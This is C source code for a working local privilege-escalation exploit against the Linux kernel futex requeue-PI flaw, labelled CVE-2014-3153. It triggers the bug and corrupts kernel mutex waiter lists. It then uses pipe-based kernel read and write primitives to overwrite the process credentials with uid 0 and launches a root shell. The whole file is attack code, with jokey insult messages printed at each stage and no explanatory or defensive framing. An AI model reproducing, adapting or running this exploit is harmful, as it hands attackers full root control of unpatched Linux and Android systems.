#define _GNU_SOURCE
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/sem.h>
#include <sys/time.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <linux/futex.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/tcp.h>


struct list_head {
        struct list_head *next, *prev;
};

struct plist_node {
        int                     prio;
        struct list_head        prio_list;
        struct list_head        node_list;
};

struct rt_mutex_waiter {
        struct plist_node	list_entry;
        struct plist_node	pi_list_entry;
        struct task_struct	*task;
        struct rt_mutex         *lock;
#ifdef CONFIG_DEBUG_RT_MUTEXES
        unsigned long    	ip;
        struct pid              *deadlock_task_pid;
        struct rt_mutex         *deadlock_lock;
#endif
};


typedef volatile u_int32_t futex_t;

#ifndef FUTEX_WAIT_REQUEUE_PI
#define FUTEX_WAIT_REQUEUE_PI 11
#endif
#ifndef FUTEX_CMP_REQUEUE_PI
#define FUTEX_CMP_REQUEUE_PI 12
#endif

#define		NEXT_WAITER	0x13370000
#define		PREV_WAITER	0x73310000
#define		WAITER_OFFSET	348
#define		OVERWRITE_SIZE	20
#define		MSGS		10
#define		BUFSIZE		200
#define		MMSGS		10


int			destfutex, srcfutex;
ushort			sem_values[(WAITER_OFFSET + OVERWRITE_SIZE)/2];
ulong			tbase;
int			prio_proceed = 0;

#define futex(uaddr, op, val, timeout, uaddr2, val3, opflags) \
	syscall(SYS_futex, uaddr, op | opflags, val, timeout, uaddr2, val3)


static inline int futex_lock_pi(uaddr, timeout, detect, opflags)
futex_t 	*uaddr; 
struct timespec *timeout;
int 		detect;
int 		opflags;
{
 	return futex(uaddr, FUTEX_LOCK_PI, detect, timeout, NULL, 0, opflags);
}

static inline int futex_wait_requeue_pi(uaddr, val, uaddr2, timeout, opflags)
futex_t 	*uaddr; 
futex_t 	val;
futex_t 	*uaddr2;
struct timespec *timeout;
int 		opflags;
{
   	return futex(uaddr, FUTEX_WAIT_REQUEUE_PI, val, timeout, uaddr2, 0, opflags);
}

static inline int futex_cmp_requeue_pi(uaddr, val, uaddr2, nr_wake, nr_requeue, opflags)
futex_t 	*uaddr; 
futex_t 	val;
futex_t 	*uaddr2; 
int 		nr_wake;
int 		nr_requeue;
int 		opflags;
{
   	return futex(uaddr, FUTEX_CMP_REQUEUE_PI, nr_wake, nr_requeue, uaddr2, val, opflags);
}



ssize_t read_kern(writebuf, readbuf, count) 
void		*writebuf;
void		*readbuf;
size_t		count;
{
    	int 			pipefd[2];
     	ssize_t 		len;

    	
	pipe(pipefd);

   	len = write(pipefd[1], writebuf, count);

    	if (len != count) 
    	    perror("write");
    
	read(pipefd[0], readbuf, count);

     	close(pipefd[0]);
    	close(pipefd[1]);

  	return len;
}

ssize_t write_kern(readbuf, writebuf, count) 
void            *writebuf;
void            *readbuf;
size_t          count;
{
    	int 			pipefd[2];
    	ssize_t 		len;


   	pipe(pipefd);

   	write(pipefd[1], writebuf, count);
   	len = read(pipefd[0], readbuf, count);

     	if (len != count) 
           	perror("read");

   	close(pipefd[0]);
   	close(pipefd[1]);

    	return len;
    }


void *buggy_thread(prio)
void		*prio;
{
	int			sem_id, sockfd;
	struct sockaddr_in	sa;
	struct mmsghdr		msgs[MMSGS];  
	int			ret, i;
	struct iovec		iovecs[MMSGS];
	char 			bufs[MMSGS][BUFSIZE +1];
	 

        sa.sin_family = AF_INET;
        sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        sa.sin_port = htons(1234);

        for (i = 0; i < MMSGS; i++) 
	{
        	iovecs[i].iov_base         = bufs[i];
        	iovecs[i].iov_len          = BUFSIZE;
	        msgs[i].msg_hdr.msg_iov    = &iovecs[i];
        	msgs[i].msg_hdr.msg_iovlen = 1;
	}
	


	setpriority(PRIO_PROCESS, 0, *(int *)prio);

	if((sem_id = semget(IPC_PRIVATE, (WAITER_OFFSET+OVERWRITE_SIZE)/2 , IPC_CREAT | 0660)) < 0)
	{
		fprintf(stderr, "   - semget failed. Your odor alone makes me aggravated, agitated and infuriated!\n");
		exit(1);
	}	

	if((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
	{
		fprintf(stderr, "   - socket failed. Your odor alone makes me aggravated, agitated and infuriated!\n");
		exit(1);
	}

	if ((ret = bind(sockfd, (struct sockaddr *) &sa, sizeof(sa))) == -1)
	{
		fprintf(stderr, "   - bind failed. Your odor alone makes me aggravated, agitated and infuriated!\n");
		exit(1);
	} 

	fprintf(stdout, "   + buggy_thread ready and waiting\n");
	futex_wait_requeue_pi(&srcfutex, 0, &destfutex, NULL, 0);

	semctl(sem_id, -1, SETALL, sem_values);
	syscall(__NR_recvmmsg, sockfd, &msgs, MMSGS, 0, NULL);

	while(1)
		sleep(1);
	
	return NULL;
}

void *holder_thread(prio)
void		*prio;
{
	int				ret;
	
	setpriority(PRIO_PROCESS, 0, *(int *)prio);

	fprintf(stdout, "   + pi_state securing\n");
	if((ret = futex_lock_pi(&destfutex, NULL, 0, 0)) < 0)
	{
		fprintf(stderr, "   - holding pi_state failed. Your odor alone makes me aggravated, agitated and infuriated!\n");
		exit(1);
	}


	return NULL;
}

void *leak_thread(prio)
void		*prio;
{
        struct timespec         t;
        int                     fd, ret;
        void                    *task, *creds;
        void                    *addr;
        ulong                   limit = 0xffff1337;
        ulong                   newuid = 0x00000000;

        fd = open("/dev/null", O_RDWR);

        t.tv_sec = time(NULL) + 8;
        t.tv_nsec = 0;

        setpriority(PRIO_PROCESS, 0, *(int *)prio);
	fprintf(stdout, "   + leak_thread locked\n");
        if((ret = futex_lock_pi(&destfutex, &t, 0, 0)) < 0) 
		fprintf(stdout, "   + leak_thread unlocked\n");
	sleep(8);

	fprintf(stdout, "[0b] Escalating. I'll skewer you like a sow at a buffet!\n");
        addr = (void *) tbase;
	if(write(fd, (void *)addr, 4) != 4)
		fprintf(stdout, "   + high address: this might take some time\n");
        while(write(fd, (void *)addr, 4) != 4)
        {
  		  sleep(1);
        }
	prio_proceed = 1;

        read_kern((void *)addr, (void *)&task, 4);
        fprintf(stdout, "   + task = 0x%x\n", task);
        write_kern((void *)addr+0x18, (void *)&limit, 4);

        read_kern((void *)task+0x304, (void *)&creds, 4);
        fprintf(stdout, "   + creds = 0x%x\n", creds);

        write_kern((void *)creds+0x14, (void *)&newuid, 4);
        write_kern((void *)creds+0x18, (void *)&newuid, 4);
        write_kern((void *)creds+0x4, (void *)&newuid, 4);
        write_kern((void *)creds+0x8, (void *)&newuid, 4);
        if(!geteuid() && !getuid())
		fprintf(stdout, "   + got root. Throughout the Caribbean my great deeds are celebrated!\n");
	else
		fprintf(stderr, "   - no root?! You're the ugliest monster ever created!\n");

	system("/bin/bash");

	while(1)
		sleep(1);

        return NULL;
}


void *prio_thread(prio)
void            *prio;
{


        setpriority(PRIO_PROCESS, 0, *(int *)prio);

        futex_lock_pi(&destfutex, NULL, 0, 0);

	while(1)
		sleep(1);

        return NULL;
}
	

int main(argc,argv)
int		argc;
char		**argv[];
{


	cpu_set_t			mask;
	int				ret, prio;
	struct rt_mutex_waiter		*next_waiter, *prev_waiter, *overwrite_waiter;
	pthread_t			bt, ht, lt, pt, at;


	CPU_ZERO(&mask);
	CPU_SET(0, &mask);

	fprintf(stdout, "\t***** CVE-2014-3153 exploit *****\n");


	fprintf(stdout, "[0b] Allocating. En garde! Touche!\n");
	if((ret = sched_setaffinity(getpid(), sizeof(mask), &mask)) < 0)
	{
		fprintf(stderr, "\t- sched_setaffinity failed. Oh, that is so cliche!\n");
		exit(1);
	}
	fprintf(stdout, "   + affinity mask set\n");

	if((next_waiter = mmap((void *)NEXT_WAITER, sizeof(struct rt_mutex_waiter), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0))	== MAP_FAILED)
	{
		fprintf(stderr, "\t- mmap(next_waiter) failed. Oh, that is so cliche!\n");
		exit(1);
	}
	fprintf(stdout, "   + next_waiter allocated\n");
	
	if((prev_waiter = mmap((void *)PREV_WAITER, sizeof(struct rt_mutex_waiter), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0)) == MAP_FAILED)
	{
		fprintf(stderr, "\t- mmap(prev_waiter) failed. Oh, that is so cliche!\n");
		exit(1);
	}
	fprintf(stdout, "   + prev_waiter allocated\n");

	overwrite_waiter = (struct rt_mutex_waiter *) (sem_values + (WAITER_OFFSET/2));
        overwrite_waiter->list_entry.prio = 131;
        overwrite_waiter->list_entry.prio_list.next = (void *) NEXT_WAITER+0x4;
        overwrite_waiter->list_entry.prio_list.prev = 0x0;
        overwrite_waiter->list_entry.node_list.next = (void *) NEXT_WAITER+0xc;
        overwrite_waiter->list_entry.node_list.prev = 0x0;
 
	next_waiter->list_entry.prio = 139;
	next_waiter->list_entry.prio_list.prev = (void *) PREV_WAITER + 0x4;
	next_waiter->list_entry.node_list.prev = (void *) PREV_WAITER + 0xc;

	
	fprintf(stdout, "[0b] Triggering. I'll leave you devastated, mutilated and perforated!\n"); 
	if((ret = futex_lock_pi(&destfutex, NULL, 0, 0)) < 0)
	{	
		fprintf(stderr, "   - futex_lock_pi failed. Your odor alone makes me aggravated, agitated and infuriated!\n");
		exit(1);
	}

	prio = 11;
	if((ret = pthread_create(&bt, NULL, buggy_thread, &prio)) != 0) 
	{
		fprintf(stderr, "   - buggy_thread failed. Your odor alone makes me aggravated, agitated and infuriated!\n");
		exit(1);
	}
	sleep(3);

	if((ret = futex_cmp_requeue_pi(&srcfutex, srcfutex, &destfutex, 1, 2, 0)) < 0)
	{
		fprintf(stderr, "   - futex_cmp_requeue_pi failed. Your odor alone makes me aggravated, agitated and infuriated! \n");
		exit(1);
	}
	sleep(3);

	prio = 10;
	if((ret = pthread_create(&ht, NULL, holder_thread, &prio)) != 0)
	{
		fprintf(stderr, "   - holder_thread failed. Your odor alone makes me aggravated, agitated and infuriated!\n");
		exit(1);
	}	
	
	sleep(2);

	destfutex = 0;
	if((ret = futex_cmp_requeue_pi(&destfutex, 0, &destfutex, 1, 0, 0)) < 0)
		fprintf(stdout, "   + buggy_requeue did it\n");	
	sleep(6);

	fprintf(stdout, "[0b] Corrupting. I'll hound you night and day!\n");
	prio = 12;
	if((ret = pthread_create(&lt, NULL, leak_thread, &prio)) != 0)
	{
		fprintf(stderr, "   - leak_thread failed. Then be a good dog. Sit! Stay!\n");
		exit(1);
	} 
	sleep(5);

        tbase = (unsigned long) next_waiter->list_entry.node_list.prev & 0xffffe000;
        fprintf(stdout, "   + thread base: 0x%x\n", tbase);
        next_waiter->list_entry.prio_list.prev = (void *) tbase+0x18;

	sleep(5);
	prio = 13;
	if((ret = pthread_create(&pt, NULL, prio_thread, &prio)) != 0)
	{
		fprintf(stderr, "   - prio_thread failed. Then be a good dog. Sit! Stay!\n");
		exit(1);
	}
	sleep(6);

	while(!prio_proceed)
	{	
		next_waiter->list_entry.prio_list.prev = (void *) tbase+0x18;
		if((ret = pthread_create(&at, NULL, prio_thread, &prio)) != 0)
		{
			fprintf(stderr, "   - prio_thread failed. When I'm done with you, you'll be a boneless fillet!\n");
			exit(1);
		}
		sleep(3);
	}

	while(1)
		sleep(1);

	return 0;
}	

